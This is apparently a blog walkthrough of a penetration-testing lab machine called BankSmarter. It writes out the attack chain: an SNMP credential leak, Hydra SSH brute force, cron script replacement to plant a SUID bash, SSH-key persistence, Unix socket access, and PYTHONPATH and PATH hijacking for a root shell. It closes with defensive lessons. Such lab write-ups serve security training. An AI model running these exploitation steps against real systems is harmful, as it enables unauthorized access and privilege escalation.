<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BankSmarter | Zerotrace Logs</title>
  <meta name="description" content="Complete walkthrough of BankSmarter machine from HackSmarter Labs. Learn SNMP enumeration, cron job hijacking, Unix socket exploitation, and SUID binary abuse techniques." />

  <!-- Essential Open Graph tags for LinkedIn -->
  <meta property="og:title" content="BankSmarter | Zerotrace Logs" />
  <meta property="og:description" content="Complete walkthrough covering SNMP enumeration, cron job hijacking, Unix socket exploitation, and PYTHONPATH hijacking for privilege escalation on Ubuntu 24.04." />
  <meta property="og:image" content="https://z3rotrace.live/assets/banksmarter/hydra-ssh-bruteforce.png" />
  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/banksmarter.html" />
  <meta property="og:type" content="article" />

  <!-- Twitter Card tags -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="BankSmarter | Zerotrace Logs" />
  <meta name="twitter:description" content="Complete walkthrough covering SNMP enumeration, cron job hijacking, Unix socket exploitation, and PYTHONPATH hijacking for privilege escalation on Ubuntu 24.04." />
  <meta name="twitter:image" content="https://z3rotrace.live/assets/banksmarter/hydra-ssh-bruteforce.png" />

  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
  <link rel="apple-touch-icon" href="../assets/favicon.png" />
  <link rel="stylesheet" href="../style.css?v=4"/>
  <style>
    /* Machine info box styling */
    .machine-info {
      background: rgba(0, 170, 255, 0.05);
      border: 1px solid rgba(0, 170, 255, 0.25);
      border-left: 4px solid #c77dff;
      border-radius: 8px;
      padding: 1rem 1.25rem;
      margin: 1.5rem 0;
    }

    .machine-info ul {
      margin: 0;
      padding-left: 0;
    }

    .machine-info li {
      margin-bottom: 0.25rem;
    }

    .machine-info li::before {
      color: #00aaff;
    }

    /* Attack chain summary box */
    .attack-chain {
      background: rgba(199, 125, 255, 0.05);
      border: 1px solid rgba(199, 125, 255, 0.25);
      border-left: 4px solid #c77dff;
      border-radius: 8px;
      padding: 1rem 1.25rem;
      margin: 1.5rem 0;
    }

    .attack-chain ol {
      margin: 0;
    }

    /* Tool list styling */
    .tools-list {
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
      margin: 1rem 0;
      padding: 0;
    }

    .tools-list li {
      background: rgba(0, 170, 255, 0.08);
      border: 1px solid rgba(0, 170, 255, 0.2);
      border-radius: 6px;
      padding: 0.4rem 0.8rem;
      font-size: 0.9rem;
      margin: 0;
    }

    .tools-list li::before {
      content: none;
    }

    /* Lessons learned styling */
    .lessons-learned li {
      margin-bottom: 0.75rem;
    }
  </style>
</head>
<body>
<header>
  <h1 class="terminal-title" aria-label="Zerotrace Logs">
    <span class="prompt" aria-hidden="true">$</span>
    <span class="typed" id="term-typing" aria-hidden="true"></span>
    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
    <span class="sr-only">Zerotrace Logs</span>
  </h1>
</header>

<!-- Side hamburger control -->
<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
  <span class="sr-only">Toggle navigation</span>
  <span class="hamburger-icon" aria-hidden="true"></span>
</button>

<!-- Sidebar navigation -->
<aside class="sidebar" id="sidebar" aria-label="Main navigation">
  <div class="sidebar-header">
    <h3>Navigate</h3>
    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
  </div>
  <div class="sidebar-content">
    <ul class="sidebar-nav">
      <li><a href="../index.html">Home</a></li>
      <li class="has-submenu">
        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Writeups</button>
        <ul class="submenu" hidden>
          <li><a href="../writeups/ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
          <li><a href="../writeups/sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
        </ul>
      </li>
      <li class="has-submenu">
        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
        <ul class="submenu">
          <li><a href="welcome.html">Welcome</a></li>
          <li><a href="staged.html">Staged</a></li>
          <li><a href="buildingmagic.html">BuildingMagic</a></li>
          <li><a href="arasaka.html">Arasaka</a></li>
          <li><a href="midgarden2-badsuccessor.html">Midgarden2</a></li>
          <li><a href="banksmarter.html" aria-current="page">BankSmarter</a></li>
          <li><a href="ascension.html">Ascension</a></li>
          <li><a href="slayer.html">Slayer</a></li>
          <li><a href="anomaly.html">Anomaly</a></li>
          <li><a href="sharethepain.html">ShareThePain</a></li>
          <li><a href="sysco.html">Sysco</a></li>
        </ul>
      </li>
      <li><a href="../vector3.html">Certification Journey</a></li>
      <li class="has-submenu">
        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
        <ul class="submenu" hidden>
          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
        </ul>
      </li>
    </ul>
  </div>
</aside>
<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>

<section>
  <h2>BankSmarter</h2>

  <div class="machine-info">
    <ul>
      <li><strong>Platform:</strong> HackSmarter Labs</li>
      <li><strong>Difficulty:</strong> Medium</li>
      <li><strong>OS:</strong> Ubuntu 24.04 LTS</li>
      <li><strong>Key Topics:</strong> SNMP Enumeration, Cron Job Hijacking, Unix Socket Exploitation, SUID Binary Abuse</li>
    </ul>
  </div>

  <h3>Objective</h3>
  <p>As a senior operator on the Hack Smarter Red Team, the objective is to perform a penetration test against a standalone Linux server. The goal is to gain initial access, escalate privileges to root, and retrieve the final flag from <code>/root/</code>.</p>

  <h2>Reconnaissance</h2>

  <h3><span class="step">[Step 1]</span> TCP Port Scan</h3>
  <p>Starting with a comprehensive TCP port scan to identify open services:</p>
  <pre><code>$ nmap -p- -T4 -sC -sV 10.1.54.58 -o nmap_scan</code></pre>

  <p>Only SSH was found open:</p>
  <pre><code>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14</code></pre>

  <h3><span class="step">[Step 2]</span> UDP Port Scan</h3>
  <p>Since TCP revealed minimal attack surface, I ran a UDP scan to discover additional services:</p>
  <pre><code>$ sudo nmap --top-ports 1000 -sU -T4 10.1.54.58 -o nmap_scan_udp</code></pre>

  <pre><code>PORT    STATE SERVICE
161/udp open  snmp</code></pre>

  <div class="question">
    <strong>What is SNMP?</strong>
  </div>
  <div class="answer">
    Simple Network Management Protocol (SNMP) is used for monitoring and managing network devices. When configured with weak community strings (like "public"), it can leak sensitive system information including usernames, processes, and configuration details. SNMP is often overlooked during security assessments but can be a goldmine for attackers.
  </div>

  <h2>Initial Access</h2>

  <h3><span class="step">[Step 3]</span> SNMP Enumeration</h3>
  <p>I used <code>snmpwalk</code> to query the SNMP service with the default community string:</p>
  <pre><code>$ snmpwalk -v 2c -c public 10.1.54.58</code></pre>

  <p>Key finding in the contact information:</p>
  <pre><code>iso.3.6.1.2.1.1.4.0 = STRING: "Admin Layne.Stanley:[REDACTED]'"</code></pre>

  <p>Credentials leaked via SNMP: <code>Layne.Stanley:[REDACTED]</code></p>

  <div class="note">
    <strong>Lesson:</strong> SNMP with default community strings is a common misconfiguration. Always enumerate UDP services, especially SNMP (161), TFTP (69), and DNS (53).
  </div>

  <h3><span class="step">[Step 4]</span> Username Enumeration</h3>
  <p>I generated username permutations using username-anarchy to find the valid SSH username format:</p>
  <pre><code>$ ./username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl,last > users.list

$ cat users.list
layne
layne.stanley
laynes
lstanley
stanley</code></pre>

  <h3><span class="step">[Step 5]</span> SSH Brute Force</h3>
  <p>Using Hydra to validate the discovered credentials against the username list:</p>
  <pre><code>$ hydra -L users.list -p '[REDACTED]' ssh://10.1.54.58</code></pre>

  <p><img src="../assets/banksmarter/hydra-ssh-bruteforce.png" alt="Hydra confirms valid credentials for layne.stanley"></p>

  <h3><span class="step">[Step 6]</span> SSH Access</h3>
  <p>Successfully authenticated as layne.stanley:</p>
  <pre><code>$ ssh layne.stanley@10.1.54.58
layne.stanley@ip-10-1-54-58:~$</code></pre>

  <h2>Privilege Escalation: layne.stanley to scott.weiland</h2>

  <h3><span class="step">[Step 7]</span> Process Monitoring</h3>
  <p>I noticed a script in the home directory owned by another user:</p>
  <pre><code>$ ls -la
-rwxr-x--- 1 scott.weiland layne.stanley  127 Sep 12 12:45 bankSmarter_backup.sh</code></pre>

  <p>I transferred <code>pspy64</code> to monitor running processes:</p>
  <pre><code>$ ./pspy64</code></pre>

  <p><img src="../assets/banksmarter/pspy-cron-execution.png" alt="pspy showing scheduled script execution"></p>

  <p>The script runs periodically as <code>UID=1002</code> (scott.weiland):</p>
  <pre><code>$ getent passwd 1002
scott.weiland:x:1002:1002::/home/scott.weiland:/bin/bash</code></pre>

  <h3><span class="step">[Step 8]</span> Script Replacement Attack</h3>
  <p>The script is owned by scott.weiland, but I have write access to the directory. This means I can rename the original script and create a malicious replacement:</p>
  <pre><code>$ mv bankSmarter_backup.sh bankSmarter_backup1.sh
$ cat > bankSmarter_backup.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/.bash_scott
chmod 4755 /tmp/.bash_scott
EOF
$ chmod +x bankSmarter_backup.sh</code></pre>

  <p>After the cron job executes, I can leverage the SUID bash copy:</p>
  <pre><code>$ /tmp/.bash_scott -p
.bash_scott-5.2$ whoami
scott.weiland</code></pre>

  <p>For persistence, I added my SSH key to scott.weiland's authorized_keys:</p>
  <pre><code>$ mkdir -p /home/scott.weiland/.ssh
$ echo 'ssh-ed25519 AAAA...' >> /home/scott.weiland/.ssh/authorized_keys
$ chmod 700 /home/scott.weiland/.ssh
$ chmod 600 /home/scott.weiland/.ssh/authorized_keys</code></pre>

  <div class="note">
    <strong>Key Insight:</strong> Even if you cannot write to a file, having write access to the parent directory enables file replacement attacks. This is why directory permissions are just as critical as file permissions.
  </div>

  <h2>Privilege Escalation: scott.weiland to ronnie.stone</h2>

  <h3><span class="step">[Step 9]</span> Unix Socket Discovery</h3>
  <p>Continuing process monitoring, I found another service running:</p>
  <pre><code>CMD: UID=1003 PID=530 | /usr/bin/python3 /opt/bank/pty_server.py</code></pre>

  <p>Enumerating <code>/opt/bank</code> revealed:</p>
  <ul>
    <li>Script <code>start_ronnie_tmux.sh</code> sets up shared tmux</li>
    <li>Active PTY server at <code>/opt/bank/sockets/live.sock</code></li>
    <li>Socket has group permissions (770) with <code>bank-team</code> group</li>
    <li>Current user is member of <code>bank-team</code> group</li>
  </ul>

  <div class="question">
    <strong>What is a Unix Socket?</strong>
  </div>
  <div class="answer">
    Unix domain sockets allow inter-process communication on the same machine. They appear as files in the filesystem and can be protected using standard file permissions. If permissions are misconfigured, unauthorized users can connect to privileged services running behind these sockets.
  </div>

  <h3><span class="step">[Step 10]</span> Socket Exploitation</h3>
  <p>Using socat to connect to the exposed Unix socket:</p>
  <pre><code>$ socat - UNIX-CONNECT:/opt/bank/sockets/live.sock</code></pre>

  <p><img src="../assets/banksmarter/unix-socket-shell.png" alt="Successful shell as ronnie.stone via Unix socket"></p>

  <h2>Privilege Escalation: ronnie.stone to root</h2>

  <h3><span class="step">[Step 11]</span> SUID Binary Discovery</h3>
  <p>Searching for SUID binaries revealed a custom binary:</p>
  <pre><code>$ find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/bank_backupd</code></pre>

  <pre><code>$ ls -la /usr/local/bin/bank_backupd
-rwsr-x--- 1 root bankers 16192 Sep 12 13:23 /usr/local/bin/bank_backupd</code></pre>

  <p>The binary has SUID bit set and is owned by root. Running it shows:</p>
  <pre><code>$ /usr/local/bin/bank_backupd
[bank_backupd] Starting backup for BankSmarter accounts...
[bank_backup.py] Running internal Python verification...
[bank_backup.py] Hashing account transactions...
[REDACTED]
[bank_backup.py] Backup completed successfully.</code></pre>

  <h3><span class="step">[Step 12]</span> Python Script Analysis</h3>
  <p>The binary calls a Python script that imports hashlib:</p>
  <pre><code>#!/usr/bin/env python3
import hashlib, time, os
print("[bank_backup.py] Running internal Python verification...")
print(hashlib.sha256(b"transaction data").hexdigest())</code></pre>

  <div class="question">
    <strong>What is PYTHONPATH Hijacking?</strong>
  </div>
  <div class="answer">
    Python searches for modules in directories specified by PYTHONPATH before standard locations. If an attacker can control PYTHONPATH and the SUID binary preserves environment variables, they can create a malicious module that gets loaded instead of the legitimate one, leading to code execution with elevated privileges.
  </div>

  <h3><span class="step">[Step 13]</span> PYTHONPATH Exploitation</h3>
  <p>Created a malicious <code>hashlib.py</code> module:</p>
  <pre><code>$ cd /tmp
$ cat > hashlib.py << 'EOF'
#!/usr/bin/env python3
import os
os.setuid(0)
os.setgid(0)
os.system("/bin/bash -p")
EOF</code></pre>

  <p>Set PYTHONPATH and execute the SUID binary:</p>
  <pre><code>$ export PYTHONPATH=/tmp
$ /usr/local/bin/bank_backupd</code></pre>

  <p><img src="../assets/banksmarter/pythonpath-root-shell.png" alt="Successful root shell via PYTHONPATH hijacking"></p>

  <h2>Root Flag</h2>
  <pre><code># cat /root/root.txt
FLAG{...}</code></pre>

  <h2>Alternative Method: PATH Hijacking</h2>
  <p>The Python script uses a shebang that relies on the PATH environment variable:</p>
  <pre><code>#!/usr/bin/env python3</code></pre>

  <p>This means it uses whatever <code>python3</code> is first in PATH. Alternative exploitation:</p>
  <pre><code>$ echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/python3
$ chmod +x /tmp/python3
$ export PATH=/tmp:$PATH
$ /usr/local/bin/bank_backupd
# whoami
root</code></pre>

  <h2>Tools Used</h2>
  <ul class="tools-list">
    <li><strong>Nmap</strong> - TCP/UDP port scanning</li>
    <li><strong>snmpwalk</strong> - SNMP enumeration</li>
    <li><strong>username-anarchy</strong> - Username generation</li>
    <li><strong>Hydra</strong> - SSH brute force</li>
    <li><strong>pspy</strong> - Process monitoring</li>
    <li><strong>socat</strong> - Unix socket connection</li>
  </ul>

  <h2>Attack Chain Summary</h2>
  <div class="attack-chain">
    <ol>
      <li><strong>SNMP Leak:</strong> Discovered credentials in SNMP contact field</li>
      <li><strong>SSH Access:</strong> Logged in as layne.stanley</li>
      <li><strong>Cron Hijack:</strong> Replaced scheduled script to get scott.weiland shell</li>
      <li><strong>Socket Abuse:</strong> Connected to privileged Unix socket for ronnie.stone</li>
      <li><strong>PYTHONPATH:</strong> Hijacked Python imports via SUID binary for root</li>
    </ol>
  </div>

  <h2>Lessons Learned</h2>
  <div class="answer lessons-learned">
    <ol>
      <li><strong>Secure SNMP:</strong> Change default community strings and restrict access. Never store sensitive information in SNMP fields.</li>
      <li><strong>Directory permissions matter:</strong> Even if you cannot write to a file, directory write access enables replacement attacks.</li>
      <li><strong>Audit scheduled tasks:</strong> Cron jobs with user-writable scripts are dangerous. Monitor and restrict what users can modify.</li>
      <li><strong>Unix sockets need ACLs:</strong> Group membership can enable unauthorized access. Apply principle of least privilege to socket permissions.</li>
      <li><strong>Environment inheritance:</strong> SUID binaries should sanitize PYTHONPATH and PATH. Use absolute paths in shebangs when security is critical.</li>
    </ol>
  </div>

  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>

</section>

<footer>
  <div class="social-links" aria-label="Social media">
    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
      </svg>
    </a>
    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
      </svg>
    </a>
    <a href="https://www.linkedin.com/in/zerotrace/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
      </svg>
    </a>
  </div>
  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
</footer>
<script src="../script.js"></script>
</body>
</html>
